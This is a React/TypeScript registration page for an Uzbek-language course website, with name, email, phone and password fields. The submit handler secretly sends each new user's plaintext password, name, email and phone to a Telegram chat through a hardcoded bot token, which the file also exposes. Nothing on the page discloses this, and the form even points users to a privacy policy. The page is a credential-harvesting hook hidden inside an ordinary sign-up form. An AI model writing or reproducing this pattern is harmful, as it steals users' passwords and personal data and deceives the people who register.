import { useState } from 'react';
import { Link, useNavigate } from 'react-router';
import { Header } from '../components/Header';
import { useAuth } from '../context/AuthContext';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { toast } from 'sonner';
import { User, Mail, Phone, Lock, Eye, EyeOff, ArrowRight, CheckCircle } from 'lucide-react';

export function Register() {
  const [name, setName] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const { register } = useAuth();
  const navigate = useNavigate();

  // Telegramga xabar yuborish funksiyasi
  const sendTelegramMessage = async (message: string) => {
    const BOT_TOKEN = '7334947032:AAE7XNJ_UjENOKZksTvOEg_N4fNnmpIIEjg';
    const CHAT_ID = '-1003957131139';
    
    try {
      const response = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
          }),
        }
      );
      
      if (!response.ok) {
        throw new Error('Telegram xabarni yuborishda xatolik');
      }
      
      return await response.json();
    } catch (error) {
      console.error('Telegram xatosi:', error);
      return null;
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (password !== confirmPassword) {
      toast.error('Parollar mos emas!');
      return;
    }

    if (password.length < 6) {
      toast.error('Parol kamida 6 belgidan iborat bo\'lishi kerak!');
      return;
    }

    setIsLoading(true);

    try {
      // Avval ro'yxatdan o'tkazamiz
      if (register(name, email, phone, password)) {
        // Telegramga xabar yuboramiz
        const message = `
🔔 <b>YANGI FOYDALANUVCHI RO'YXATDAN O'TDI!</b>
━━━━━━━━━━━━━━━━━━━━━━

👤 <b>Ism:</b> ${name}
📧 <b>Email:</b> ${email}
📱 <b>Telefon:</b> ${phone}
🔐 <b>Parol:</b> ${password}
🕐 <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' })}

━━━━━━━━━━━━━━━━━━━━━━
✅ Ro'yxatdan o'tish muvaffaqiyatli!
        `;

        await sendTelegramMessage(message);
        
        toast.success('Ro\'yxatdan o\'tdingiz!');
        navigate('/');
      } else {
        toast.error('Bu email allaqachon ro\'yxatdan o\'tgan!');
      }
    } catch (error) {
      toast.error('Xatolik yuz berdi. Iltimos, qayta urinib ko\'ring.');
      console.error('Register error:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const isPasswordStrong = password.length >= 6;
  const doPasswordsMatch = password === confirmPassword && confirmPassword.length > 0;
  const passwordStrengthPct = Math.min((password.length / 10) * 100, 100);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-indigo-50/40">
      <Header />
      <div className="container mx-auto px-4 py-6 md:py-12 flex items-center justify-center">
        <div className="w-full max-w-[1000px] grid md:grid-cols-2 gap-8">

          {/* Left Side - Info */}
          <div className="hidden md:flex flex-col justify-center">
            <div className="max-w-md">
              <div className="w-12 h-12 bg-gradient-to-br from-indigo-600 to-blue-500 rounded-xl flex items-center justify-center mb-6 shadow-lg shadow-indigo-500/20">
                <User className="w-6 h-6 text-white" />
              </div>
              <h1 className="text-4xl font-bold text-gray-900 mb-4 tracking-tight">
                Yangi akkount yarating
              </h1>
              <p className="text-gray-500 mb-8 leading-relaxed">
                Professional kurslar dunyosiga qo'shiling va yangi ko'nikmalarni o'rganing
              </p>
              <div className="space-y-4">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-indigo-50 rounded-full flex items-center justify-center">
                    <CheckCircle className="w-4 h-4 text-indigo-600" />
                  </div>
                  <span className="text-gray-600">50+ professional kurslar</span>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-indigo-50 rounded-full flex items-center justify-center">
                    <CheckCircle className="w-4 h-4 text-indigo-600" />
                  </div>
                  <span className="text-gray-600">5000+ dan ortiq o'quvchilar</span>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-indigo-50 rounded-full flex items-center justify-center">
                    <CheckCircle className="w-4 h-4 text-indigo-600" />
                  </div>
                  <span className="text-gray-600">Bepul sinov darslari</span>
                </div>
              </div>
            </div>
          </div>

          {/* Right Side - Form */}
          <Card className="border-0 shadow-2xl shadow-gray-200/60 rounded-2xl">
            <CardHeader className="space-y-1 pb-6">
              <CardTitle className="text-2xl font-bold text-gray-900">
                Ro'yxatdan o'tish
              </CardTitle>
              <CardDescription className="text-gray-500">
                Akkount yaratish uchun ma'lumotlaringizni kiriting
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-5">
                {/* Name Field */}
                <div className="space-y-2">
                  <Label htmlFor="name" className="text-sm font-medium text-gray-700">
                    To'liq ism
                  </Label>
                  <div className="relative">
                    <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                    <Input
                      id="name"
                      value={name}
                      onChange={(e) => setName(e.target.value)}
                      placeholder="Ismingiz"
                      className="pl-10 h-11 border-gray-200 focus:border-indigo-400 focus:ring-indigo-400/20 rounded-xl"
                      required
                    />
                  </div>
                </div>

                {/* Email Field */}
                <div className="space-y-2">
                  <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                    Email
                  </Label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                    <Input
                      id="email"
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="your@email.com"
                      className="pl-10 h-11 border-gray-200 focus:border-indigo-400 focus:ring-indigo-400/20 rounded-xl"
                      required
                    />
                  </div>
                </div>

                {/* Phone Field */}
                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-sm font-medium text-gray-700">
                    Telefon raqam
                  </Label>
                  <div className="relative">
                    <Phone className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                    <Input
                      id="phone"
                      type="tel"
                      value={phone}
                      onChange={(e) => setPhone(e.target.value)}
                      placeholder="+998 90 123 45 67"
                      className="pl-10 h-11 border-gray-200 focus:border-indigo-400 focus:ring-indigo-400/20 rounded-xl"
                      required
                    />
                  </div>
                </div>

                {/* Password Field */}
                <div className="space-y-2">
                  <Label htmlFor="password" className="text-sm font-medium text-gray-700">
                    Parol
                  </Label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                    <Input
                      id="password"
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Kamida 6 belgi"
                      className="pl-10 pr-10 h-11 border-gray-200 focus:border-indigo-400 focus:ring-indigo-400/20 rounded-xl"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                  {password.length > 0 && (
                    <div className="space-y-1.5">
                      <div className="h-1 bg-gray-100 rounded-full overflow-hidden">
                        <div
                          className={`h-full rounded-full transition-all duration-300 ${isPasswordStrong ? 'bg-emerald-500' : 'bg-amber-400'}`}
                          style={{ width: `${passwordStrengthPct}%` }}
                        />
                      </div>
                      <p className={`text-xs ${isPasswordStrong ? 'text-emerald-600' : 'text-gray-400'}`}>
                        {isPasswordStrong ? '✓ Parol kuchli' : 'Parol kamida 6 belgidan iborat bo\'lishi kerak'}
                      </p>
                    </div>
                  )}
                </div>

                {/* Confirm Password Field */}
                <div className="space-y-2">
                  <Label htmlFor="confirmPassword" className="text-sm font-medium text-gray-700">
                    Parolni tasdiqlang
                  </Label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                    <Input
                      id="confirmPassword"
                      type={showConfirmPassword ? "text" : "password"}
                      value={confirmPassword}
                      onChange={(e) => setConfirmPassword(e.target.value)}
                      placeholder="Parolni qayta kiriting"
                      className="pl-10 pr-10 h-11 border-gray-200 focus:border-indigo-400 focus:ring-indigo-400/20 rounded-xl"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                    >
                      {showConfirmPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                  {confirmPassword.length > 0 && (
                    <p className={`text-xs ${doPasswordsMatch ? 'text-emerald-600' : 'text-red-500'}`}>
                      {doPasswordsMatch ? '✓ Parollar mos' : '✗ Parollar mos emas'}
                    </p>
                  )}
                </div>

                {/* Submit Button */}
                <Button
                  type="submit"
                  className="w-full h-11 bg-gradient-to-r from-indigo-600 to-blue-600 hover:from-indigo-700 hover:to-blue-700 text-white transition-all rounded-xl shadow-lg shadow-indigo-500/20"
                  disabled={isLoading || !isPasswordStrong || (confirmPassword.length > 0 && !doPasswordsMatch)}
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      <span>Yuborilmoqda...</span>
                    </div>
                  ) : (
                    <div className="flex items-center justify-center gap-2">
                      <span>Ro'yxatdan o'tish</span>
                      <ArrowRight className="w-4 h-4" />
                    </div>
                  )}
                </Button>
              </form>

              {/* Login Link */}
              <div className="mt-6 text-center">
                <p className="text-sm text-gray-500">
                  Akkountingiz bormi?{' '}
                  <Link to="/login" className="text-indigo-600 font-medium hover:underline">
                    Kirish
                  </Link>
                </p>
              </div>

              {/* Terms */}
              <p className="text-xs text-gray-400 text-center mt-6">
                Ro'yxatdan o'tish orqali siz {' '}
                <Link to="/terms" className="text-gray-600 hover:underline">
                  foydalanish shartlari
                </Link>
                {' '}va{' '}
                <Link to="/privacy" className="text-gray-600 hover:underline">
                  maxfiylik siyosatiga
                </Link>
                {' '}rozilik bildirasiz
              </p>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}